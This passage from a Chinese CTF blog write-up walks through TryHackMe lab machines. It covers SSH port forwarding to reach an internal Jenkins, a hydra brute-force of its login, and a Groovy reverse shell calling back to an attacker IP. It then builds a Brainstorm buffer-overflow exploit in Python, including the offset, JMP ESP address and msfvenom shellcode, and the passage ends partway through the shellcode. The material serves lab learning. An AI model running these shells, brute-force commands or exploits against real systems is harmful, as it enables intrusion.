<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839779.png" alt="image-20240430095629882"></p>
<h2 id="ssh端口转发拿下内网主机">ssh端口转发拿下内网主机</h2>
<pre><code class="hljs scss">curl -U aubreanna:bubb13guM!@<span class="hljs-number">#123</span> http://<span class="hljs-number">172.17</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">8080</span>/</code></pre>
<p>由于我们不能访问其内网，因此需要ssh端口转发一下</p>
<pre><code class="hljs scss">ssh -f -N -L <span class="hljs-number">4567</span>:<span class="hljs-number">172.17</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">8080</span> aubreanna@internal.thm
#根据前述结果，登录密码为：bubb13guM!@<span class="hljs-number">#123</span>
#ssh端口转发(本地网卡地址<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>可省略)：HostB$ ssh -L <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:PortB:HostC:PortC user@HostC
#参数说明
#-C：压缩数据
#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。
#-N ：不执行脚本或命令，通常与-f连用。
#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。
#-L : 本地隧道，本地端口:目标IP:目标端口
#-D : 动态端口转发
#-R : 远程隧道
#-T ：不分配 TTY 只做代理用
#-q ：安静模式，不输出 错误/警告 信息</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839780.png" alt="image-20240430095943633"></p>
<p>发现Jenkins组件，尝试爆破账户密码，猜测用户名就是admin</p>
<h2 id="hydra暴力破解">hydra暴力破解</h2>
<pre><code class="hljs scss">hydra -l admin -<span class="hljs-selector-tag">P</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> -s <span class="hljs-number">4567</span> <span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> http-post-<span class="hljs-selector-tag">form</span> "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%<span class="hljs-number">2</span>F&amp;Submit=Sign+in:Invalid username or password<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839781.png" alt="image-20240430101130883"></p>
<p>成功得到密码，接下来就是执行bash，不过尝试了很多，结果还是walkthrough有效？下去看看为何</p>
<p>好的，这是因为这个脚本控制台就提示了我们只能使用groovy script</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839782.png" alt="image-20240430114039571"></p>
<p>发现google搜索即可得到</p>
<pre><code class="hljs scss">String host="<span class="hljs-number">10.14</span><span class="hljs-selector-class">.79</span><span class="hljs-selector-class">.125</span>";
int port=<span class="hljs-number">6666</span>;
String cmd="/bin/bash";
Process <span class="hljs-selector-tag">p</span>=new <span class="hljs-built_in">ProcessBuilder</span>(cmd)<span class="hljs-selector-class">.redirectErrorStream</span>(true)<span class="hljs-selector-class">.start</span>();Socket s=new <span class="hljs-built_in">Socket</span>(host,port);InputStream pi=<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.getInputStream</span>(),pe=<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.getErrorStream</span>(), si=s<span class="hljs-selector-class">.getInputStream</span>();OutputStream po=<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.getOutputStream</span>(),so=s<span class="hljs-selector-class">.getOutputStream</span>();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so<span class="hljs-selector-class">.write</span>(pi.read());<span class="hljs-built_in">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so<span class="hljs-selector-class">.write</span>(pe.read());<span class="hljs-built_in">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po<span class="hljs-selector-class">.write</span>(si.read());so<span class="hljs-selector-class">.flush</span>();po<span class="hljs-selector-class">.flush</span>();Thread<span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">50</span>);try {<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.exitValue</span>();break;}catch (Exception e){}};<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.destroy</span>();s<span class="hljs-selector-class">.close</span>();</code></pre>
<p>找到下面位置，执行shell即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839783.png" alt="image-20240430102107036"></p>
<h2 id="密码泄露提权root">密码泄露提权root</h2>
<p>拿到shell，依旧信息搜集，发现root用户密码，su切换即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839784.png" alt="image-20240430102645299"></p>
<p>拿到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839785.png" alt="image-20240430102710588"></p>
<h2 id="总结">总结</h2>
<p>又给我整emo了，什么时候才能凭借自己做出一个。。。</p>
<p>首先常规扫描，只发现了22、80端口，那毫无疑问扫web站点，同时访问80看看页面是否有什么信息泄露，发现是一个wp站点 ，同时泄露了版本：5.4.2，但似乎没有什么利用思路。接着就是wpscan工具的利用了，利用它可以扫wp版本、可能的用户名、爆破密码、插件漏洞、使用的主题等等。</p>
<p>这里本是可以扫出主题信息的，但我不知道为何扫不出来，随后就是根据wp目录结构，找到登陆页面，利用wpscan暴力破解密码，之后进入后台编辑PHP文件，拿到shell，发现自己是最普通用户，本以为是利用配置漏洞来提权啥的，但还是需要回归本质，做一手信息搜集，这里walkthrough是搜集到了opt目录下存在用户密码泄露，接着su就可以切换用户，但还不是 root，之后发现其内网网段还存在一个web服务，但我们在外网，需要端口转发（在回顾一手ssh端口转发），接着本地可以访问其内网了，然后发现是jenkins组件，hydra暴力破解进入后台，执行shell，监听拿到shell，发现该主机下也有密码泄露，得到root密码。成功提权</p>
<p>总的来说，还是需要有思路和技术的经验积累，虽然我扫出了相关信息，但还是无从下手，之后在回顾一下之前的旅程，看接下来的靶机是否会更进一步吧。</p>
<p>顺便说一下刚开始为何IP访问会出现页面渲染不全的问题，但用域名访问就会正常：</p>
<pre><code class="hljs scss">当只使用IP地址访问网站而无法正常渲染的原因可能有以下几点：

<span class="hljs-number">1</span>. 虚拟主机配置：许多网站使用虚拟主机技术，在同一台服务器上托管多个网站。当通过域名访问网站时，Web服务器可以根据请求的域名将请求路由到正确的虚拟主机，从而提供正确的网站内容。但是，当您只使用IP地址访问网站时，服务器无法确定您要访问哪个虚拟主机，可能会返回默认的或错误的内容。

<span class="hljs-number">2</span>. 域名绑定和重定向：有些网站可能使用域名绑定或重定向来将特定的域名映射到对应的网站目录或URL。当您只使用IP地址访问网站时，缺少了域名信息，可能无法触发正确的域名绑定或重定向操作，导致渲染不全或显示错误的内容。

<span class="hljs-number">3</span>. 基于域名的资源加载：网站中的一些资源（例如样式表、JavaScript文件、图像等）可能使用相对路径或基于域名的绝对路径进行引用。当只使用IP地址访问网站时，浏览器无法确定正确的域名，因此无法加载这些资源，导致网站渲染不全或缺少样式和图像等元素。

使用域名访问网站可以解决上述问题，因为域名提供了更多的信息和上下文，使得服务器能够正确地处理请求并提供正确的内容。如果只能使用IP地址访问网站，并且遇到了渲染不全的问题，建议使用域名访问，或者联系网站管理员以获取更多支持和解决方案。</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17149180.html">【THM】Internal-练习</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/118548932">wpscan使用教程</a></p>
<h1 id="0x13-brainstorm">0x13 Brainstorm</h1>
<h2 id="常规枚举">常规枚举</h2>
<p>快速扫描发现开放了三个端口</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839786.png" alt="image-20240602131610924"></p>
<p>接着尝试继续枚举ftp服务，ftp ip登录，发现可以匿名登录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839787.png" alt="image-20240602133425285"></p>
<p>但是当我们执行ls的时候，发现其进入了被动模式，也没有任何数据的显示，查资料发现，passive即可退出。</p>
<p>之后继续尝试ls命令，发现无法识别，切换dir，发现charserver目录，进入之后看到exe二进制文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839788.png" alt="image-20240602134450173"></p>
<p>当我尝试想下载这两个文件的时候，爆出如下错误</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839789.png" alt="image-20240602135151198"></p>
<p>上述图片说明，文件不能正确的传输，我们可以尝试切换到二进制模式来传输文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839790.png" alt="image-20240602135303777"></p>
<p>接着thm提示我们：</p>
<p>枚举后，您现在一定已经注意到，在陌生端口上交互的服务与您找到的文件有某种关系！无论如何，您可以利用该奇怪的服务来访问系统吗？</p>
<p>值得使用 Python 脚本来尝试不同的有效负载来获得访问权限！您甚至可以使用这些文件在本地尝试该漏洞。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839791.png" alt="image-20240602140024791"></p>
<p>进一步对9999进行枚举，发现这些关键词，可以想到与先前的chatserver二进制文件有关，也就是考察缓冲区溢出漏洞</p>
<h2 id="fuzzing">Fuzzing</h2>
<p>不会改脚本。。。。手动跟着视频做吧。首先就是确定crashed的字符数，直接用python生成一个5000长度的A字符，发送，如下图所示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839792.png" alt="image-20240602145019251"></p>
<p>这里看到username没有缺陷，但是当我们在message中发送长字符，如下图，发现EBP、EIP都被A覆盖掉了，存在缓冲区溢出</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839793.png" alt="image-20240602144928184"></p>
<h2 id="寻找eip">寻找EIP</h2>
<p>看到异常paused，接下来就是得到EIP的起始地址 offset 了，利用msf生成足够让该程序溢出的长度字符。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839794.png" alt="image-20240602145513669"></p>
<p>如下图，能看到这里EIP的地址为31704330，我们继续利用msf看一下对应的offset是什么</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839795.png" alt="image-20240602145609143"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839796.png" alt="image-20240602150110945"></p>
<p>得到2012偏移量，当然这里利用mona也可以得到2012</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839797.png" alt="image-20240602150227966"></p>
<p>接下来写脚本，确定我们能够覆盖EIP了。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"192.168.246.232"</span>
port = <span class="hljs-number">9999</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">2012</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"BBBB"</span>
padding = <span class="hljs-string">""</span>
payload = <span class="hljs-string">""</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  s.recv(<span class="hljs-number">1024</span>)
  s.send(<span class="hljs-built_in">bytes</span>(username + <span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"latin-1"</span>))
  s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>如下图，证明我们寻找的EIP地址是正确的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839798.png" alt="image-20240602151622841"></p>
<h2 id="确定badchars">确定badchars</h2>
<p>接下来就是寻找badchars，以便我们生成shellcode</p>
<p>如下图，这里测试之后发现并没有badchars，至于原因，在后面在讨论</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839799.png" alt="image-20240602152405457"></p>
<p>下面是用于测试badchars的脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"192.168.246.232"</span>
port = <span class="hljs-number">9999</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">2012</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"BBBB"</span>
padding = <span class="hljs-string">""</span>
payload = <span class="hljs-string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  s.recv(<span class="hljs-number">1024</span>)
  s.send(<span class="hljs-built_in">bytes</span>(username + <span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"latin-1"</span>))
  s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>利用mona，得到esp地址，这里我选择第一个：</p>
<pre><code class="hljs scss">!mona jmp -r esp -cpb "\x00" =》<span class="hljs-number">0</span>x625014df=》\xdf\x14\x50\x62</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839800.png" alt="image-20240602152742748"></p>
<h2 id="缓冲区溢出拿到shell">缓冲区溢出拿到shell</h2>
<p>那我们就能直接编写exp了，将IP改一下，然后msf生成shellcode</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839801.png" alt="image-20240602153642942"></p>
<p>脚本如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"10.10.207.193"</span>
port = <span class="hljs-number">9999</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">2012</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"\xdf\x14\x50\x62"</span>
padding = <span class="hljs-string">"\x90"</span> * <span class="hljs-number">32</span>
payload =  <span class="hljs-string">""</span>
payload += <span class="hljs-string">"\xdb\xd3\xb8\x4c\xbf\x83\xc9\xd9\x74\x24\xf4\x5d"</span>
payload += <span class="hljs-string">"\x2b\xc9\xb1\x52\x31\x45\x17\x83\xed\xfc\x03\x09"</span>
payload += <span class="hljs-string">"\xac\x61\x3c\x6d\x3a\xe7\xbf\x8d\xbb\x88\x36\x68"</span>
payload += <span class="hljs-string">"\x8a\x88\x2d\xf9\xbd\x38\x25\xaf\x31\xb2\x6b\x5b"</span>
payload += <span class="hljs-string">"\xc1\xb6\xa3\x6c\x62\x7c\x92\x43\x73\x2d\xe6\xc2"</span>
payload += <span class="hljs-string">"\xf7\x2c\x3b\x24\xc9\xfe\x4e\x25\x0e\xe2\xa3\x77"</span>
payload += <span class="hljs-string">"\xc7\x68\x11\x67\x6c\x24\xaa\x0c\x3e\xa8\xaa\xf1"</span>
payload += <span class="hljs-string">"\xf7\xcb\x9b\xa4\x8c\x95\x3b\x47\x40\xae\x75\x5f"</span>
payload += <span class="hljs-string">"\x85\x8b\xcc\xd4\x7d\x67\xcf\x3c\x4c\x88\x7c\x01"</span>
payload += <span class="hljs-string">"\x60\x7b\x7c\x46\x47\x64\x0b\xbe\xbb\x19\x0c\x05"</span>
payload += <span class="hljs-string">"\xc1\xc5\x99\x9d\x61\x8d\x3a\x79\x93\x42\xdc\x0a"</span>
payload += <span class="hljs-string">"\x9f\x2f\xaa\x54\xbc\xae\x7f\xef\xb8\x3b\x7e\x3f"</span>
payload += <span class="hljs-string">"\x49\x7f\xa5\x9b\x11\xdb\xc4\xba\xff\x8a\xf9\xdc"</span>
payload += <span class="hljs-string">"\x5f\x72\x5c\x97\x72\x67\xed\xfa\x1a\x44\xdc\x04"</span>
payload += <span class="hljs-string">"\xdb\xc2\x57\x77\xe9\x4d\xcc\x1f\x41\x05\xca\xd8"</span>
payload += <span class="hljs-string">"\xa6\x3c\xaa\x76\x59\xbf\xcb\x5f\x9e\xeb\x9b\xf7"</span>
payload += <span class="hljs-string">"\x37\x94\x77\x07\xb7\x41\xd7\x57\x17\x3a\x98\x07"</span>
payload += <span class="hljs-string">"\xd7\xea\x70\x4d\xd8\xd5\x61\x6e\x32\x7e\x0b\x95"</span>
payload += <span class="hljs-string">"\xd5\x8b\xc7\xd4\xee\xe4\xd5\xd6\xe5\x47\x50\x30"</span>
payload += <span class="hljs-string">"\x6f\xb8\x35\xeb\x18\x21\x1c\x67\xb8\xae\x8a\x02"</span>
payload += <span class="hljs-string">"\xfa\x25\x39\xf3\xb5\xcd\x34\xe7\x22\x3e\x03\x55"</span>
payload += <span class="hljs-string">"\xe4\x41\xb9\xf1\x6a\xd3\x26\x01\xe4\xc8\xf0\x56"</span>
payload += <span class="hljs-string">"\xa1\x3f\x09\x32\x5f\x19\xa3\x20\xa2\xff\x8c\xe0"</span>
payload += <span class="hljs-string">"\x79\x3c\x12\xe9\x0c\x78\x30\xf9\xc8\x81\x7c\xad"</span>
payload += <span class="hljs-string">"\x84\xd7\x2a\x1b\x63\x8e\x9c\xf5\x3d\x7d\x77\x91"</span>
